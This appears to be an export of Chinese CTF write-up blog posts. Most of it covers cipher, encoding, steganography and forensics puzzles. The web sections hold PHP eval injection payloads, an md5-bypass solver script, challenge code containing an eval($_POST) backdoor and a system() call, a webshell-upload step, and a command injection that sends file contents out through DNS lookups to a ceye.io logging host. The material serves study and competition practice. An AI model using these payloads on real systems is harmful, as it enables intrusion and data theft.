一个十六岁的少年很容易想到base16加密。12345678题目内容：有一天，表姐的好朋友贝丝远房的表亲，一个16岁的少年给表姐递了一封情书，表姐看不懂，你能帮忙翻译下吗？666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D&gt;&gt;&gt; decode = base64.b16decode(b&apos;666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D&apos;)&gt;&gt;&gt; decodeb&apos;flag&#123;ec8b2ee0-3ae9-4c21-a012-08aa5fa7be67&#125;&apos; +——+Brainfuck编码12345678910题目内容：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- --.+. ----- -.&lt;+++++++ [-&gt;++ +++++ &lt;]&gt;++ ++.-- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- .------.++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; --.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;+++++ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ---.+ +++++ +.+++ ++.-- ----- .&lt;+++++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- .&lt;+++ ++++[-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;.++ ++.-- -.--- -.&lt;++ +++++[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- ---.- --.&lt;+ ++++++[-&gt;+ +++++ +&lt;]&gt;+ ..&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.-- -.+.+ ++.-- ---.+++++. ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt; 解密地址 福尔摩斯1234题目内容：贝克街旁的圆形广场·-· ·-· ·-· ·-· ·-· ·-· ·flag格式：flag&#123;*********&#125; 摩斯电码，和对照表对比一下得到flag misc1-纵横四海题目提示分久必合合久必分，所以把压缩包里面每个文件的内容拼接起来就是flag这种排序第一次看到，当然也可以用python来解决。12345//windows下命令行**&gt; cd tiaoxiwoya**&gt; type dabiaojie* &gt;&gt;flag.txtflag&#123;0a47061d-0619-4932-abcd-5426f4ea34aa&#125;fjicjeowqkfoqwjfoqf 常在邮件头里的秘密12题目内容：flag&#123;ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6&#125; 没接触过这个编码，所以参考了一下wp1234曾接触过类似特征的编码，判断为可打印字符编码(Quoted_Printable),在线解码即得到flag在所有邮件处理的各式各样的编码中，很多编码的目的都是通过编码手段使 得七位字符的邮件协议体系可以传送八位的二进制文件、双字节语言文字等等。 Quoted-Printable也是这样一些编码中的一个， 它的目的同样是帮助非ASCII 编码的信件传输通过 SMTP。Quoted-Printable 编码是字符对应的编码，每个未 编码的二进制字符被编码成三个字符，即一个等号和一个十六进制的数字，如“=A8”。 Quoted-Printable编码的源码样式如下: =D4=DA=CB=F9=D3=D0=D3=CA=BC=FE=B4=A6=C0=ED…… 解密地址 吃货一看到题目就想到培根密码1234567891011121314151617题目内容：麻辣烫的标配flag&#123;abbab_babbb_baaaa_aaabb&#125;培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：第一种方式：A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaabK ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabbU babaa V babab W babba X babbb Y bbaaa Z bbaab第二种方式a AAAAA g AABBA n ABBAA t BAABAb AAAAB h AABBB o ABBAB u-v BAABBc AAABA i-j ABAAA p ABBBA w BABAAd AAABB k ABAAB q ABBBB x BABABe AABAA l ABABA r BAAAA y BABBAf AABAB m ABABB s BAAAB z BABBB misc11、binwalk 没东西2、图像分析 没结果3、winhex flag在底部 misc2给了一张图片以为是隐写，浪费了好多时间没做出来，后面看了官方的WP才知道是猪圈密码1flag&#123;NSN&#125; misc3百度一下键盘坐标密码1234567891011121314151617181920212223242526题目内容：哒哒哒哒，你知道什么是键盘坐标密码吗？11 21 31 18 27 33 34flag格式：flag&#123;*****&#125;什么是键盘坐标密码：我们注意到大键盘区所有的字母上面都有其对应的数字，这个位置几乎在所有的键盘都是相同的。所以我们可以利用这一点应用单表替换的方法进行加密[注2]：1 2 3 4 5 6 7 8 9 0Q W E R T Y U I O PA S D F G H J K LZ X C V B N M我们根据上表可以得出，Q是1下面的第一个，A是1下面的第二个……以此类推，每一个字母都会有其对应的数字：A 12 B 53 C 33第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置就可以得到最后的答案：flag&#123;QAZIJ**&#125;QAZIJCVflag&#123;*********&#125; 听说是rc4算法123题目内容：key welcometoicqedu 密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw== 这里参考了这篇文章python脚本如下：1234567891011121314151617181920212223242526272829import random, base64 from hashlib import sha1 def crypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return ‘‘.join(out) def tdecode(data, key, decode=base64.b64decode, salt_length=16): if decode: data = decode(data) salt = data[:salt_length] return crypt(data[salt_length:], sha1(key + salt).digest()) if __name__==‘__main__‘: data = ‘UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==‘ key = ‘welcometoicqedu‘ decoded_data = tdecode(data=data, key=key) print decoded_data 传说中的签到题纯脑洞题，被秀的不要不要的啊啊啊啊啊啊阿好像打出题人QAQ123456题目内容：小编保证这次是正常的签到题。按例，继续调戏小i公众号输入关键词“答案在哪里”就能获得你想要的。诺！扫码直接关注 1、去公众号回复发现没有什么突破口2、扫描二维码 发现一些文字“就算你发现我但是知道flag是什么??”所以flag就是 什么 misc2-对错直接进制转换得到flag。12301100110 01101100 01100001 01100111 01111011 01111010 01101000 01000101 01100011 00111001 00110000 00110011 00110100 01101010 01101111 01100100 01110011 01101010 01100110 01101111 01110011 01101011 01101111 01111101f l a g &#123; z h E c 9 0 3 4 j o d s j f o s k o &#125; misc3-枯竭得到一个压缩包1、文件头好像不对，修复了一下，还是打不开；2、试了一下伪加密，还是打不开；3、那就只能暴力破解了，选择数字先爆破一下，得到密码为12345解压得到flag。 misc1 祸起北荒题目讲了很多,重点还是123第一层虚数空间是需要与一个上古神器“i春秋”进行智能比拼，获取开启第一层虚数空间的flag启动法诀： 元宵节百度杯与红包更加搭配哟！ 应该又是脑洞题，乖乖去调戏公众号就能得到flag。 misc2 上古神器12345.......但是你需要帮助我将这个波斯传来的“波利比奥斯棋盘”上的秘密解决掉 华夜拿到该棋盘，只见棋盘盒上分布着一串十分奇异的数字：“3534315412244543_434145114215_132435231542”华夜微微思量，只见他大袖一会，手上立马变出一个计算器，瘦削的指尖快速的点击...... 根据提示知道这应该是波利比奥斯棋盘密码 1234535 34 31 54 12 24 45 43 _ 43 41 45 11 42 15 _ 13 24 35 23 15 42polyb i/j us_square_c i/j pherflag&#123;polybius_square_cipher&#125; misc3 此去经年12345678910111213141516171819题目内容：第三层虚数空间是由一位已经陨落的上古剑圣--独孤求败一手创立的，据说这位上古大神痴迷诗词，其中最爱的便是一首解谜诗原本有心花不开偶尔有人来相伴悔时无心已有泪吞下口去悄无声来者耳边轻轻诉缺少左边心相印东风带走一二点一生只败在了两件事上，第一件事是这首解谜诗另外一件事是，没有动用丝毫武力便败给了劲敌东方不败失败的原因没能填满东方不败出的一首诗句他将这首残诗刻在了通往第四层虚数空间的通关法诀上只有填满句诗词，才能走出这层虚数空间5LiD5pyI5Zyo6YeOICA=5YWr5pyI5Zyo5a6HIA==5Lmd5pyI5Zyo5oi3tips：比赛结束，已无红包活动flag格式：flag&#123;*****&#125; 关键在于:5LiD5pyI5Zyo6YeOICA=5YWr5pyI5Zyo5a6HIA==5Lmd5pyI5Zyo5oi3这里用base64（utf8编码（UNICode编码））解出来没有乱码12345678七月在野 八月在宇 九月在户百度一下发现:《豳风.七月》是《诗经》中最典型的农业生活诗，是风诗中最长的一篇，88句，380字。在艺术上也是“三百篇”中比较突出的一篇。 七月在野:七月蟋蟀野地鸣;八月在宇:八月屋檐底下唱;九月在户:九月跳进房门槛;十月蟋蟀入我床下:十月到我床下藏; 所以 flag&#123;十月蟋蟀入我床下&#125; misc web爆破-1源码：123456789&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];if(!preg_match(&apos;/^\w*$/&apos;,$a ))&#123; die(&apos;ERROR&apos;);&#125;eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; 题目给了源码，想到爆破出所有变量，于是直接 ?hello=GLOBALS 把所有变量都 dump 出来1array(9) &#123; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;hello&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(9) &#123; [&quot;pgv_pvi&quot;]=&gt; string(10) &quot;2802929664&quot; [&quot;chkphone&quot;]=&gt; string(33) &quot;acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O&quot; [&quot;UM_distinctid&quot;]=&gt; string(60) &quot;16176885763527-0f2c301dba1077-5d4e211f-1fa400-16176885764384&quot; [&quot;Hm_lvt_9104989ce242a8e03049eaceca950328&quot;]=&gt; string(21) &quot;1519914875,1520501772&quot; [&quot;Hm_lvt_1a32f7c660491887db0960e9c314b022&quot;]=&gt; string(21) &quot;1519914875,1520501772&quot; [&quot;pgv_si&quot;]=&gt; string(10) &quot;s478899200&quot; [&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;]=&gt; string(43) &quot;1520501368,1520574774,1520575056,1520575073&quot; [&quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;]=&gt; string(10) &quot;1520579191&quot; [&quot;ci_session&quot;]=&gt; string(40) &quot;553fee565b59e375b93043b3adf8995c062b6d42&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;_REQUEST&quot;]=&gt; array(1) &#123; [&quot;hello&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;flag&quot;]=&gt; string(38) &quot;flag在一个长度为6的变量里面&quot; [&quot;d3f0f8&quot;]=&gt; string(42) &quot;flag&#123;749acbfa-62f1-482c-a2f4-52f1f7e02030&#125;&quot; [&quot;a&quot;]=&gt; string(7) &quot;GLOBALS&quot; [&quot;GLOBALS&quot;]=&gt; *RECURSION* misc web爆破-2源码：12345&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];eval( &quot;var_dump($a);&quot;);show_source(__FILE__); 构造paylaod1234567http://360a4885832d4a96988832fc3632eead954c62591b3c45a9.game.ichunqiu.com/?hello=file_get_contents(&apos;flag.php&apos;)flag在源代码里找到QWQstring(83) &quot;&lt;?php$flag = &apos;Too Young Too Simple&apos;;#flag&#123;80dbae50-0a97-467f-98c5-3dc638c9a8ed&#125;; misc web爆破-3又是源码审计，源码：123456789101112131415161718192021222324252627282930&lt;?php error_reporting(0);session_start();require(&apos;./flag.php&apos;);if(!isset($_SESSION[&apos;nums&apos;]))&#123; $_SESSION[&apos;nums&apos;] = 0; $_SESSION[&apos;time&apos;] = time(); $_SESSION[&apos;whoami&apos;] = &apos;ea&apos;;&#125;if($_SESSION[&apos;time&apos;]+120&lt;time())&#123; session_destroy();&#125;$value = $_REQUEST[&apos;value&apos;];$str_rand = range(&apos;a&apos;, &apos;z&apos;);$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION[&apos;whoami&apos;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123; $_SESSION[&apos;nums&apos;]++; $_SESSION[&apos;whoami&apos;] = $str_rands; echo $str_rands;&#125;if($_SESSION[&apos;nums&apos;]&gt;=10)&#123; echo $flag;&#125;show_source(__FILE__);?&gt; 只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag参考了https://www.ichunqiu.com/writeup/detail/721python脚本：123456789import requestsurl=&apos;http://290a655e11204667990900a8f741265809ac4172461b40fe.game.ichunqiu.com/&apos;session=requests.Session()html=session.get(url+&apos;?value[]=ea&apos;).textfor i in range(10): html=session.get(url+&apos;?value[]=&apos;+html[0:2]).text if &apos;flag&#123;.*&#125;&apos; in html: breakprint (html) All your Base are belong to us12345601001001 01100011 01100101 01000011 01010100 01000110 01111011 01100001 01101100 00110001 0101111101101101 01111001 01011111 01100010 01100001 01110011 01100101 01110011 01011111 01100001 0111001001100101 01011111 01111001 01101111 01110101 01110010 01110011 01011111 01100001 01101110 0110010001011111 01100001 01101100 01101100 01011111 01111001 00110000 01110101 01110010 01011111 0110001001100001 01110011 01100101 01110011 01011111 01100001 01110010 01100101 01011111 01101101 0110100101101110 01100101 01111101 直接二进制转ASCII得到flag:12345678I c e C T F &#123; a l 1 _m y _ b a s e s _ a re _ y o u r s _ a n d_ a l l _ y 0 u r _ ba s e s _ a r e _ m in e &#125;IceCTF&#123;al1_my_bases_are_yours_and_all_y0ur_bases_are_mine&#125; Pretty Pixels得到一张图片，提示和像素有关1、尝试修改图片尺寸，发现不是png像素隐写2、LSB隐写尝试了一下也不是3、将RGB三个通道的值都提取出来得到一张新的图片这里参考了https://zhuanlan.zhihu.com/p/22678856IceCTF{puT_Th4t_1n_yoUr_cOlOrin9_Book_4nD_5moKe_1T} IRC 1百度了一下是IRC服务器，这里参考了https://zhuanlan.zhihu.com/p/22678856123自己下个客户端：mIRC，设置服务器为glitch.is，端口设置为6667，然后随便起个名字，右键查看Glitch的whois信息，会发现@#6470e394cb_flagshare，双击进入频道之后，就可以得到flagIceCTF&#123;pL3AsE_D0n7_5h4re_fL495_JUsT_doNT&#125; Scavenger Hunt12题目内容：There is a flag hidden somewhere on our website, do you think you can find it? Good luck! 因为这个题目是复现题目，所以应该去找比赛的官网。 访问官网(Home - IceCTF),查看源码发现提到一个github地址，在github中的IceCTF项目下，找到ctf-landing/icectf/templates/sponsors.html，查看代码可以发现flag 现在请求发现未响应了233333github地址 内涵图winhex打开图片，查找一下即可看到flagflag{I_I-0_0-*_*} kill12题目内容：Is kill can fix? Sign the autopsy file? get新姿势：使用strings.exe对kill.pcapng中的可打印字符进行提取，保存到strings.txt文件中，命令【strings.exe kill.pcapng &gt;strings.txt】参考https://www.ichunqiu.com/writeup/detail/611 Bubble得到一个flag.enc文件1、winhex得到一串字符串xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx2、百度一下知道是Bubble Babble Encoding3、使用python 使用方法：123456from bubblepy import BubbleBabbles=&apos;xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx&apos;bb=BubbleBabble()s1=bb.encode(s)print s1print bb.decode(s1) 小电影得到一张end.gif1、结合提示应该是一张破损的gif2、winhex修复文件头这里参考[https://blog.csdn.net/hubuguia/article/details/54577102]https://blog.csdn.net/hubuguia/article/details/54577102)1压缩包内只有一个无法正常打开的名为end.gif的文件。用winhex打开，发现文件头为”3961”，并非正常的”474946383961”(对应ascii码为GIF89A)或”474946383761”(对应ascii码为GIF87A)，故尝试在头部添加”47494638”使其格式完整 3、得到flag Thor’s a hacker now12题目内容：Thor has been staring at this for hours and he can&apos;t make any sense out of it, can you help him figure out what it is? thor.txt 1、题目给的是一个文件，打开发现是和winhex差不多的字符，但是不会把txt转成对应的lzip文件2、这里参考了https://www.ichunqiu.com/writeup/detail/593,利用linux下的xxd命令，将文本转换成文件1cat thor.txt | xxd -r &gt; thorfile 3、解压还原出来的压缩包1lzip -d thorfile 4、解压出来的是一张图片，所以改一下后缀就可以得到flag了]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安恒杯2月月赛复现记录]]></title>
    <url>%2F2018%2F03%2F07%2F%E5%AE%89%E6%81%92%E6%9D%AF2%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[手快抢了一个复现账号，就去看看这些个难题嘤嘤嘤！官方的WP：PINGhttp://forum.91ctf.com/index.php/group/topic/id-40 进击的盲注 这应该不是xxs Cipher题目描述12345题目名称Cipher题目说明还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 公平的玩———&gt;playfair密码（以前没有遇到过QAQ） playfair密码是需要秘钥的;传送门 编制密码表–还原明文–得到flag 凯撒？替换？呵呵！题目描述12345题目名称凯撒？替换？呵呵！题目说明MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; 思路1： 凯撒（行不通） 思路2： 替换密码，按照英文字母的概率规律来解题 隐含条件为–MTHJ对应flag 解密传送门 有思路2可以得到flag123FLAG&#123; SUBSTITUTION CIPHER DECRYPTION IS ALWAYS EASY JUST LIKE A PIECE OF CAKE&#125;#替换成小写提交正确 USB题目描述12345题目名称USB题目说明Do your konw usb?? 考点： usb协议的分析 压缩包的修复 对键盘记录的分析 维吉尼亚密码 栅栏密码 脚本编写能力 题目文件：ftm文件 winhex、binwalk分离，可知道是一个usb流量文件 考虑使用python的scapy模块编写脚本自动提取,提取的到key{XINAN} 脚本如下(貌似有点小问题)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python#show_keyboard.pyfrom scapy.all import * VISIBLE_KEY_CODES=&#123; 4:&quot;A&quot;, 5:&quot;B&quot;, 6:&quot;C&quot;, 7:&quot;D&quot;, 8:&quot;E&quot;, 9:&quot;F&quot;, 10:&quot;G&quot;, 11:&quot;H&quot;, 12:&quot;I&quot;, 13:&quot;J&quot;, 14:&quot;K&quot;, 15:&quot;L&quot;, 16:&quot;M&quot;, 17:&quot;N&quot;, 18:&quot;O&quot;, 19:&quot;P&quot;, 20:&quot;Q&quot;, 21:&quot;R&quot;, 22:&quot;S&quot;, 23:&quot;T&quot;, 24:&quot;U&quot;, 25:&quot;V&quot;, 26:&quot;W&quot;, 27:&quot;X&quot;, 28:&quot;Y&quot;, 29:&quot;Z&quot;, 30:&quot;1&quot;, 31:&quot;2&quot;, 32:&quot;3&quot;, 33:&quot;4&quot;, 34:&quot;5&quot;, 35:&quot;6&quot;, 36:&quot;7&quot;, 37:&quot;8&quot;, 38:&quot;9&quot;, 39:&quot;0&quot;, 40:&quot;\n&quot;, 44:&quot;&quot;, 45:&quot;&quot;, 46:&quot;=&quot;, 47:&quot;&#123;&quot;, 48:&quot;&#125;&quot;, 49:&quot;\\&quot;, 51:&quot;;&quot;, 52:&quot;&apos;&quot;, 53:&quot;~&quot;, 54:&quot;,&quot;, 55:&quot;.&quot;, 56:&quot;/&quot;,&#125;pkts = rdpcap(&quot;key.pcap&quot;)msg = &quot;&quot;for packet in pkts: keybord_data = packet.load[-8:] key_code = ord(keybord_data[2]) ch = VISIBLE_KEY_CODES.get(key_code,False) if ch: msg += chprint msg rar压缩包 1、直接解压提示233.png头部损坏（进行修复） 2、图片在分析工具下可以得到一张二维码 （扫码得到ci{v3erf_0tygidv2_fc0}，这个跟前面的KEY{XINAN}，应该是一种密码，这里考查的是维吉尼亚密码。） 揭秘传送门 3、上一步得到fa{i3eei_0llgvgn2_sc0 栅栏解密可得flag 溯源题目描述12345题目名称溯源题目说明http://ip/secret 出题思路:这道题目是一次简单的溯源流程，首先拿到一个secret文件，通过分析找到后门中隐藏的url，因为题目要提前出好，不能预先知道ip，所以把文件和web服务放到了一块，找url的过程简化为只需要找到后缀。 考点: 磁盘挂载 extendelete的使用 对chm后门的分析 php反序列化 1、文件为linux下磁盘挂载文件1mount secret /home/tmp 2、挂载一下，cd进去cat一下，发现了后门已经被删除字样，估计需要做一下磁盘恢复。12#卸载磁盘后执行下面的命令可得到一个hack.chm文件extundelete secret --inode 2 3、后门分析（windows环境）12#在同一目录下新建一个hack文件夹hh -decompile hack hack.chm 4、分离出来的，在exp.htm文件中http://xxx.xxx.xxx.xxx/C_0uT.php，猜测需要访问这个页面。5、扫描端口发现8080端口开放着web服务，简单代码审计，反序列化加文件上传6、使用80端口（因为限制了只能本地访问）的web服务上传一句话木马，然后getshell7、远程执行命可以获取flag PING首先发现有源码泄露1&lt;?php include(&quot;where_is_flag.php&quot;);echo &quot;ceshi&quot;;@eval($_POST[1]);$ip =(string)$_GET[&apos;ceshi&apos;];$ip =str_replace(&quot;&gt;&quot;,&quot;0.0&quot;,$ip);system(&quot;ceshi &quot;.$ip); 过滤了&gt;,不能使用空格和换行这里使用的是ceye来看dnslog1ping=`cat where_is_flag.php|sed s/[[:space:]]//g`.***.ceye.io 回显如下：1&lt;?php$flag=&quot;dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php&quot;;?&gt;.***.ceye.io 继续cat1ping=`cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed s/[[:space:]]//g`.***.ceye.io 得到flag1&lt;?php$flag=&quot;flag&#123;sdfsdfvdfbdgsd&#125;&quot;;?&gt;.***.ceye.io]]></content>
      <tags>
        <tag>-CTF -WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame(week-2)-未完待续]]></title>
    <url>%2F2018%2F02%2F18%2F%E5%A1%AB%E5%9D%91ing%2Fhgame-week-2-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[WEB篇最简单的SQL题是一个登录页面，试了一下万能密码登录，发现登陆成功，得到flag。1234payload:username=admin&apos; or &apos;a&apos;=&apos;a password:随便输入flag:hgame&#123;@s0ng_fen_ti@&#125; REPWNMISCCRYPTO]]></content>
      <tags>
        <tag>-wp -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP入门到放弃-1]]></title>
    <url>%2F2018%2F02%2F18%2FPHP%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83-1%2F</url>
    <content type="text"><![CDATA[PHP在CTF的WEB题经常有应用，这里简要记录一下自己在学习PHP的所见所闻，供自己复习使用，不定期更新…… 变量类型变量类型整型、浮点型、布尔型、数组、对象、NULL、资源（变量就像一个盒子，盒子里面装的是变量的值，不同的盒子就是变量类型） 12345678910111213141516171819202122231)整型[integer] 数学中的整数2)浮点型[float、double] 数学中的小数3)字符串[string] 一串字符4)布尔[boolean] 真假5)数组[array] 键值对复合数据6)对象[object] 暂时不考虑QAQ7)NULL 没有值8)资源[resource] 资源是一种特殊的变量类型，保存了到外部资源的一个引用：如打开文件、数据库连接、图形画布区域等 如何区分变量类型变量值并不是只存储变量值，还存储了它的类型1234567$a = 3;//整型$b = 3.14;//浮点型$c = null;//null型$d = &apos;helloworld&apos;;//字符串型$e = true;//布尔型echo $D;//Notice: Undefined variable 变量名称的命名规范[a-z]-[A-Z]-[0-9]以及下划线1234567891)区分大小写2)不能以数字开头//正确命名$a$_$c3//错误命名$_%$3c 变量检测ehco一个不存在的变量，会报notice级别的错误，所以有必要检测一下这个变量是否存在；isset–检测变量是否设置已声明的变量会返回true未声明的变量会返回false 123456789101112131415161718192021222324252627282930&lt;?php$b = null;$c = false;$d = 0;$e = &apos; &apos;;if(isset($a))&#123; echo &quot;变量a存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量a不存在&lt;br/&gt;&quot;;&#125;if(isset($b))&#123; echo &quot;变量b存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量b不存在&lt;br/&gt;&quot;;&#125;if(isset($c))&#123; echo &quot;变量c存在&lt;br/&gt;&quot;;&#125;else&#123; echo &quot;变量c不存在&lt;br/&gt;&quot;;&#125;?&gt;变量a不存在变量b不存在变量c存在 对于值为NULL的变量，也返回false，因为null没有值。未曾声明的变量当然也是不存在的。 类型检测 检测一个变量php将它存储成什么类型–gettype（获取变量的类型） [现成的系统函数] 12345678910111213141516171819202122&lt;?php$b = null;echo gettype($b);echo &quot;&lt;br&gt;&quot;;$c = false;echo gettype($c);echo &quot;&lt;br&gt;&quot;;$d = 0;echo gettype($d);echo &quot;&lt;br&gt;&quot;;$e = &apos; &apos;;echo gettype($e);echo &quot;&lt;br&gt;&quot;;?&gt;NULLbooleanintegerstring 判断变量是否是某种类型 123456789101112131415161718is_float() &amp; is_double()is_int() &amp; is_integer()is_string()is_object()is_array()is_resource()is_bool()is_null()//eg:$b = null;if (is_null($b)) &#123; echo &quot;b为null&lt;br&gt;&quot;;&#125;else&#123; echo &quot;b不为null&quot;;&#125; 调试打印变量 echo 字符串，数字 print_r 打印层次化的数据，比如：数组、对象 var_dump 打印变量的类型及其值123456789101112131415161718192021222324252627282930313233343536&lt;?php$a = &apos;hello&apos;;$b = array(1,2,&quot;3&quot;);$c = false;$d = null;$e = 18;$f = true;echo $a,&apos;&lt;br&gt;&apos;,$b,&apos;&lt;br&gt;&apos;,$c,&apos;&lt;br&gt;&apos;,$d,&apos;&lt;br&gt;&apos;,$e,&apos;&lt;br&gt;&apos;,$f,&apos;&lt;br&gt;&apos;,&apos;&lt;hr&gt;&apos;;print_r($b);echo &apos;&lt;br&gt;&apos;;print_r($c);echo &apos;&lt;br&gt;&apos;;print_r($d);echo &apos;&lt;br&gt;&apos;;print_r($f);echo &apos;&lt;br&gt;&apos;;echo &apos;&lt;hr&gt;&apos;;var_dump($c);echo &apos;&lt;br&gt;&apos;;var_dump($d);echo &apos;&lt;br&gt;&apos;;?&gt;-----------------------------------//布尔的true会打印1，false和null什么都不显示helloArray181------------------------------------Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 ) 1------------------------------------//布尔型数据不要用echo和print_r打印，容易干扰我们，用var_dump打印布尔和nullbool(false) NULL 类型转换赋值销毁动态变量名]]></content>
      <tags>
        <tag>-PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[happy-moctf-新春欢乐赛]]></title>
    <url>%2F2018%2F02%2F13%2Fhappy-moctf-%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[辞旧迎新，离新年没剩几天了，这次是我们自己学校的新春欢乐赛（happymoctf），又来划了一波水。 不得不佩服学弟们做的首页，秀的我这个老年人头皮发麻 WEB篇是时候让你的手指锻炼一下了访问题目地址，查看源代码，可以找到这段代码123456789101112131415161718192021&lt;script&gt; var clicks=0 $(function() &#123; $(&quot;#cookie&quot;) .mousedown(function() &#123; $(this).width(&apos;350px&apos;).height(&apos;350px&apos;); &#125;) .mouseup(function() &#123; $(this).width(&apos;375px&apos;).height(&apos;375px&apos;); clicks++; $(&quot;#clickcount&quot;).text(clicks); if(clicks &gt;= 108000)&#123; var form = $(&apos;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&apos; + &apos;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&apos; + clicks + &apos;&quot; hidden/&gt;&apos; + &apos;&lt;/form&gt;&apos;); $(&apos;body&apos;).append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt; 我们可以把clicks的次数直接改成108000，从控制台写入，用burp抓包可以得到flag。1flag:moctf&#123;Here_Is_Your_Surprise&#125; PUBG看了一下源代码发现没有什么，可能存在源码泄露，试了一下发现是bak源码泄露index.php.bak的主要内容12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); include &apos;class.php&apos;; if(is_array($_GET)&amp;&amp;count($_GET)&gt;0) &#123; if(isset($_GET[&quot;LandIn&quot;])) &#123; $pos=$_GET[&quot;LandIn&quot;]; &#125; if($pos===&quot;airport&quot;) &#123; die(&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;); &#125; elseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag); &#125; elseif($pos===&quot;AFK&quot;) &#123; die(&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;); &#125; else &#123; die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;); &#125; &#125;?&gt; 同样我们也得到class.php.bak1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php include &apos;waf.php&apos;; class sheldon&#123; public $bag=&quot;nothing&quot;; public $weapon=&quot;M24&quot;; // public function __toString()&#123; // $this-&gt;str=&quot;You got the airdrop&quot;; // return $this-&gt;str; // &#125; public function __wakeup() &#123; $this-&gt;bag=&quot;nothing&quot;; $this-&gt;weapon=&quot;kar98K&quot;; &#125; public function Get_air_drops($b) &#123; $this-&gt;$b(); &#125; public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125; else &#123; 